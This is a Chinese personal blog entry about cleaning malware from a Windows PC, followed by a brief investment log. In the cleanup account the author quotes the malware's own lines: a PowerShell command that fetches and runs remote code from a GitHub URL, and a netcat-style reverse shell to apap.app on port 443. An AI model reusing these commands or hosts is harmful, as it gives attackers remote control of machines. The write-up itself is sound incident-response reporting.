faint，电脑好像真的中招了，早上找到隐藏在cookies目录的两个脚本，看起来就不是好鸟，对应的文件昨天手贱执行过了，不知道会造成啥影响。。。

目前定位到两个目录打不开，按大模型建议准备重启到安全模式下试一试。。。


搞了一上午终于搞定了。至少全屏打游戏时不再弹窗了。

主要是通过弹出的窗口中对应的`c:\users\用户名\cookies\ini.cmd`这个文件入手。

一开始在资源管理器 `c:\users\用户名` 目录下根据找不到`cookies`目录，但在cmd命令行中是可以通过`cd`命令进入的。

还好早年玩dos的一点知识还在，使用`dir /a`命令查看，发现此目录下的`cookies`目录是个链接，真实的目录在另外一个地方。通过查看到的新的地址终于打开了这个目录，看到了这两个文件。

一个是`ini.cmd`，另一个是`init.cmd`。打开看看里面的内容都很像，指向了两个目录，一个是`c:\programdata\AUX..`，一个是`c:\programdata\CON..`。

不出意外，这两个目录能看到，但打不开、进不去也删除不掉。。。

问了下大模型，用一种第一次了解到的命令把这两个目录删除了。

```
rd /s /q "\\?\C:\ProgramData\AUX.."
rd /s /q "\\?\C:\ProgramData\CON.."
```

大模型给的说法是通过长文件名格式。其实并不理解，但确实好用。删除掉了。感觉稳了，打开游戏测试，玩了10分钟以为没事，结果下一秒就被打脸了又弹窗了。。。不过这次明显弹窗的内容有变化了。

于是打开windows事件查看器，幸运地查看到了powershell的事件，有重大发现。直接看到了如下关键脚本

```
HostApplication=powershell.exe -NoProfile -ExecutionPolicy Bypass -Command $c = (Invoke-WebRequest 'https://raw.githubusercontent.com/githab0/0/0/0/configr' -UseBasicParsing).Content.Trim(); $exe, $args = $c -split ' ', 2; ([WMIClass]'Win32_Process').Create($exe + ' ' + $args)
```

根据github地址直接查找这个`githab0`账户。里面只有一个名字叫`0`的项目。

https://github.com/githab0/0/tree/0/0

进入多层目录后看到了上面脚本里的文件，里面只有一行脚本：

```
C:\ProgramData\NUL..\ShellExperienceHost.exe --ssl apap.app 443 -e cmd.exe
```

对了，刚才在删除`AUX..`与`CON..`两个目录时，在同层目录下发现有个`NUL..`的目录一样打不开进不去删不掉，于是用相同的长文件名格式删除掉了。

所以后面弹窗才会变化，因为这个目录被我删除了，上面这行脚本执行了个寂寞，于是再度弹窗。。。提示`install.exe`找不到。。。

这都是什么鬼，哪来的`install.exe`？

想破头也想不到这个`install.exe`谁来调用的，既然是找不到，应该就是刚刚删除的那三个目录里。

看了任务管理器和启动服务列表，没看到哪个有问题的样子。。。

问了大模型，也没有头绪。于是在google上搜索了下上面发现的github项目`githab0/0`

也说不出为啥搜索这个关键字，可能是想看看有没有其他受害者的留言吧。

搜索结果给了我惊喜，第二个结果地址如下：

https://raw.githubusercontent.com/githa0/0/0/0/confrus

是不是和刚才的项目很像？看名字应该是一个人的不同账号，`githab0` vs. `githa0`，是不是很像。

这个链接对应的脚本一看就豁然开朗了，虽然期间有些内容，比如sc和WMI命令我就不太懂。但可以借助大模型啊~

有了这个脚本再结合大模型的帮助，很快就将这个恶意软件在电脑中埋的雷都排干净了。

多少会有些出入，有些脚本里看到的东西没有找到，不知道是不是昨天杀毒软件删除过一些？

清理干净后重启，打开游戏，再没有出现弹窗了~

总算解决了，就是不知道完不完美。

顺手在github上把这两个账号都举报了，也不知道官方如何处理。

看了下 `githa0`账号下还有好几个项目，估计都不是什么好东西。看了下几个脚本，感觉应该是挖矿的，可惜没有追查到具体的挖矿信息。猜测应该是硬编码在植入的exe文件中，并没有放在脚本里。

回想起来应该是前几天想下载一个bit软件，在网上找到的那个程序被加挂了。。。




# 投资


上午小红。不过一直也没空看，忙着杀毒了。。。

> 本日	0.22%	本周	1.70%	本月	0.90%	本年	0.90%


收盘更进一步。年度浮上水面1cm了 :joy:

> 本日	0.46%	本周	1.95%	本月	1.15%	本年	1.15%

小调整了下表格，把银河账户的盈亏单独调出来看看，确实要稍好一点点，其他几个账户以基金套利为主，外加小仓位网格，看来都不如可转债呀。

> 本日	0.48%	本周	2.34%	本月	1.36%	本年	1.36%


